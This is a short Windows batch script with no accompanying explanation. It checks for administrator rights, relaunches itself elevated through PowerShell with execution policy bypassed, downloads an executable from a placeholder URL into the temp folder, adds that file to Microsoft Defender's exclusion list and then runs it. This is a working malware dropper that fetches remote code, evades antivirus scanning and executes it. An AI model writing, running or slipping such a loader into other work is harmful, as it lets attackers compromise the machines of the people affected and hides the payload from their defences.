@echo off
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%file%'" & exit /b 0)
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%temp%\file.exe'"
powershell -Command "Add-MpPreference -ExclusionPath '%temp%\file.exe'"
start %temp%\file.exe
